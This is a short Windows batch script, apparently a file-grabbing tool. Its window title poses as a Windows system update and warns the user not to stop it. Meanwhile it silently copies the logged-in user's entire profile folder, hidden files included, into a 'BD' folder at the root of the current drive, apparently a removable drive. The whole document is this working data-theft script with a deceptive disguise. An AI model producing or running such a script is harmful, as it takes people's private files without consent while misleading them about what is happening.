@echo off 
title Windows System (Temp.tmp) Users Update (Warning !!) No Stop Processus  
mode con cols=120 lines=30
cd\
xcopy C:"Users\%username%" \BD /D /E /C /H /K /I /Y
exit